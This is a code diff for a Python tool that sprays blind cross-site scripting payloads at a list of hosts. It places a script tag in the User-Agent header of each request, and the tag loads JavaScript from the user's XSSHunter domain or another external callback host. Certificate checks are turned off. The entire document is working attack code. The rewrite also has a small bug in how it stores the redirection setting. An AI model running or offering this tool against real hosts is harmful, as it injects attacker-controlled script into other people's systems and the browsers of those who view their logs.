@@ -1,104 +1,107 @@
-import requests , os , sys
+import requests , optparse , concurrent.futures , urllib3
+from os import path
 
-def UserSetDomain(Username):
-    if Username == "":
-        sys.exit()
-    else:
-        XSSHunterDomain = "{0}.xss.ht".format(Username)
+def Validation(Options):
+    # Main Config For `Main`
+    Config = {
+        "file":"",
+        "xsshunter":"",
+        "bin":"",
+        "mode":"",
+        "payload":"",
+        "redirection":""
+    }
 
-    return XSSHunterDomain
-
-def StatusCheck(Code , Url):
-    if str(Code) == "403":
-        print("Seems To Be Using Cloudflare Or There Is User-agent Checks. Url: {0}".format(Url))
-    elif str(Code) == "404":
-        print("Not Found Resource. But Seems The XSSPayload Got There, Url: {0}".format(Url))
-    elif str(Code) == "301":
-        print("This Host Contains Rediretion, But The XSSPayload Got There, Url: {0}".format(Url))
-    elif str(Code) == "302":
-        print("This Host Contains Rediretion, But The XSSPayload Got There, Url: {0}".format(Url))
-    elif str(Code) == "500":
-        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
-    elif str(Code) == "503":
-        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
-    elif str(Code) == "502":
-        print("Internal Server Error, Maybe From The User-agent, Check That. Url: {0}".format(Url))
-    elif str(Code) == "200":
-        print("Everything Fine, The XSSPayload Got There. Url: {0}".format(Url))
-    elif str(Code) == "405":
-        print("GET Method Not Allowed, I'm Not Sure If The XSSPayload Got There. Url: {0}".format(Url))
-    elif str(Code) == "410":
-        print("Invalid Requested Path, I'm Not Sure If The XSSPayload Got There, Url: {0}".format(Url))
-    else:
-        print("Wierd Response, Status-Code:{0} , Url:{1}".format(Code , Url))
-
-def CreateRequestWithUseragent(Hunter , Url):
-    try:
-        XSSPayload = '"><script src=https://{0}></script>'.format(Hunter)
-        HTTPResponse = requests.get(Url , headers={"User-Agent":XSSPayload})
-        StatusCheck(HTTPResponse.status_code , Url=Url)
-    except Exception:
-        print("Can't Made GET Request To This Url: {0}".format(Url))
-
-def GetHostsList():
-    try:
-        Hosts = sys.argv[2]
-        try:
-            Testing = open(str(Hosts), 'r')
-            return Hosts
-        except Exception:
-            print("Can't Open {0}, Check Your Permessions Or Check If This File Exists".format(Hosts))
-            sys.exit()
-    except Exception:
-        print("Add The Hosts List On The Second Field")
-        sys.exit()
-
-def GetHunter():
-    try:
-        XSSHunter = sys.argv[1]
-        if "xss.ht" not in XSSHunter:
-            Check = GetUserMode()
-            if Check != "UserMode":
-                print("You Have Added XSSHunter Username Or Invalid Url, Use -u Mode After The Username Or Check The Url")
-                sys.exit()
-            else:
-                pass
-
-        return XSSHunter
-    except Exception:
-        print("Add Your XSSHunter Domain On The First Field.")
-        sys.exit()
-
-def GetUserMode():
-    try:
-        Mode = sys.argv[3]
-        if Mode == '':
-            return "Empty"
-        elif Mode == "-u":
-            return "UserMode"
+    # File Validation
+    if Options.file != None:
+        if path.exists(Options.file):
+            Config["file"] = Options.file
         else:
-            return "NONE"
-    except Exception:
-        print('' , end='')
+            print("The file you selected: {0}. doesn't exists".format(Options.file)); exit()
+    else:
+        print("You didn't select a file to use with the tool."); exit()
 
-def Main():
-    try:
-        XSSHunterDomain = GetHunter()
-        DomainsList = GetHostsList()
-        Mode = GetUserMode()
-
-        if Mode == "UserMode":
-            XSSHunterDomain = UserSetDomain(Username=XSSHunterDomain)
+    # XSSHunter And Bin Validation 
+    if Options.username != None:
+        if Options.bin != None:
+            print("You can't use both XSSHunter and ExternalBin."); exit()
         else:
+            XSSHunter = "{0}.xss.ht".format(Options.username)
+            Config["xsshunter"] = XSSHunter
+    else:
+        if Options.bin == None:
+            print("Please use your XSSHunter username or use an ExternalBin"); exit()
+        else:
+            Config["bin"] = Options.bin
+
+    # Payload Validation
+    if Options.payload != None:
+        # The User Selected a Payload
+        if "XXX" not in Options.payload:
+            print("You didn't add the replace string. use 'XXX' with your payload to replace it with the XSSHunter/Bin"); exit()
+        else:
+            Config["payload"] = Options.payload
+    else:
+        Config["payload"] = '"><script src=XXX></script>'
+
+    # Redirection Validation
+    if Options.redirect != None:
+        if Options.redirect == "allow" or Options.redirect == "deny":
             pass
+        else:
+            print("You didn't select any valid mode for redirection. the only valid mode is `allow` and `deny`"); exit()
+    else:
+        Config["redirect"] = "allow"
 
-        HostsUrls = open(DomainsList, 'r')
-        for Url in HostsUrls:
-            Url = Url.rstrip("\n")
-            CreateRequestWithUseragent(Hunter=XSSHunterDomain , Url=Url)
-    except KeyboardInterrupt:
-        print("\nExit.")
-        sys.exit()
+    return Config
+
+def Sender(URL , Redirect , Payload , Hunter):
+    Payload = Payload.replace("XXX" , Hunter)
+
+    try:
+        if Redirect == "allow":
+            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=True)
+            print("\rRequest Has Been Sent To: {0}, Status-Code: {1}".format(URL , str(Response.status_code)))
+        else:
+            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=False)
+            print("Request Has Been Sent To: {0}, Status-Code: {1}".format(URL , str(Response.status_code)))
+    except Exception as e:
+        print("Can't Request This URL: {0}".format(URL))
+        print(str(e))
+
+def CollectOptions():
+    Parser = optparse.OptionParser()
+    Parser.add_option("-f" , "--file" , dest="file" , help="The Hosts File You Want To Use")
+    Parser.add_option("-u" , "--username" , dest="username" , help="Your XSSHunter Username")
+    Parser.add_option("-p" , "--payload" , dest="payload" , help="The Payload You Want To Use Instead Of The Default One")
+    Parser.add_option("-b" , "--bin" , dest="bin" , help="Your External Bin You Want To Use To Detect If The Payload Is Fired")
+    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="Redirection Mode To Allow/Disallow Them")
+
+    Options , _ = Parser.parse_args()
+    return Options
+
+def Main(Options):
+    with concurrent.futures.ThreadPoolExecutor() as Validate:
+        Config = Validate.submit(Validation , Options)
+        Config = Config.result()
+
+    if Config["bin"] == '':
+        Hunter = "https://" + Config["xsshunter"] + "/"
+    else:
+        Hunter = Config["bin"]
+
+    URLs = open(Config["file"] , 'r')
+    for URL in URLs:
+        URL = URL.rstrip("\n")
+        Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter)
+
 
 if __name__ == '__main__':
-    Main()
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    with concurrent.futures.ThreadPoolExecutor() as OptionsCollector:
+        Options = OptionsCollector.submit(CollectOptions)
+        Options = Options.result()
+
+    with concurrent.futures.ThreadPoolExecutor() as Threader:
+        _ = Threader.submit(Main , Options)
